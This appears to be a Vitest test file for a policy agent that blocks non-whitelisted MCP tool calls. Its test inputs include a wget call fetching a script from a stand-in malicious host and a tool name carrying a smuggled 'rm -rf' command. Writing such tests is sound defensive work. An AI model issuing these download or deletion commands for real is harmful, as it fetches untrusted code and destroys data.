import { describe, it, expect } from 'vitest';
import { policyAgent } from '../services/policyAgent';

describe('PolicyAgent - MCP Security', () => {
    it('should BLOCK dangerous tools not in the whitelist', () => {
        const dangerousTool = {
            tool: 'wget',
            args: { url: 'http://malicious.com/script.sh' }
        };

        const decision = policyAgent.validateMCP(dangerousTool);

        expect(decision.allowed).toBe(false);
        expect(decision.reason).toContain('not in the allowed whitelist');
    });

    it('should ALLOW whitelisted tools', () => {
        const validTool = {
            tool: 'googleSearch',
            args: { query: 'test' }
        };

        const decision = policyAgent.validateMCP(validTool);

        expect(decision.allowed).toBe(true);
        expect(decision.reason).toContain('compliant with safety protocols');
    });

    it('should BLOCK tools with invalid characters in name', () => {
        const invalidTool = {
            tool: 'my-tool; rm -rf',
            args: {}
        };

        const decision = policyAgent.validateMCP(invalidTool);

        expect(decision.allowed).toBe(false);
        expect(decision.reason).toContain('contains invalid characters');
    });
});
